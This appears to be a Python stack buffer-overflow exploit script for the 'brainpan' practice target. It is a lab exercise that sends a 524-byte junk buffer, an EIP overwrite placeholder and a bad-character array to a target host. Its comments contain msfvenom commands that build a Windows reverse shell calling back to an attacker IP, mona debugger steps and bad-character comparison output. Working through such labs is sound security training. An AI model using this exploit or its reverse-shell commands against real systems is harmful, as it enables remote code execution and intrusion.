#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# exp for brainpain

import sys
from time import sleep
import socket

# bsize = int(sys.argv[3])
# msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine IP] LPORT=443 -f c -a x86 --platform windows -b "\x00\x0A\x0D" -e x86/shikata_ga_nai
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.94 LPORT=9090 -f python -a x86 --platform windows -b "\x00\x0A\x0D" -e x86/shikata_ga_nai -i 3

#  !mona bytearray -b "\x00\x0d\x80"

buf = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21"
"\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61"
"\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1"
"\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1"
"\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

def  attack(dst, dst_port, data):
    try:
        socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socks.connect((dst, dst_port))
        conn = socks.recv(1024)
        # print(conn)

        dd = data.encode('utf-8')
        socks.send(dd)
        print("Sending buffer: {}".format(dd))
        # print(conn)
    except socket.error as err:
        print("Socket connect failed! {}".format(err))
    finally:
        sleep(0.5)
        socks.close()

if __name__ == '__main__':

    # buffer create python -c 'print("A"*100)'
    # control esp

    junk = "A"* 524 # ebp fill with 524 bytes 41414141
    # eip = 'B' * 4   # eip register will be fill with B 42424242
    # !mona find -s "\xff\xe4"
    eip = "BBBB"  
    # make to jmp esp to execute badchar 


    # block = "C" * (1000 - 524 - 4 - 405 - 20) # esp will be fill with C block 43434343
    # nop = "\x90" * 20
    buff = (junk + eip + buf)

    host = str(sys.argv[1])
    port = int(sys.argv[2])

    attack(host, port, buff)



"""

!mona config -set workingfolder c:\tmp\%p
!mona bytearray -b "\x00\x0d"
!mona compare -f C:\tmp\brainpan\bytearray.bin -a 005FF910


mona Memory comparison results, item 0
Address=0x005ff910
Status=Corruption after 126 bytes
BadChars=00 0d 80
Type=normal
Location=Stack

\x00\x0d\x80

"""

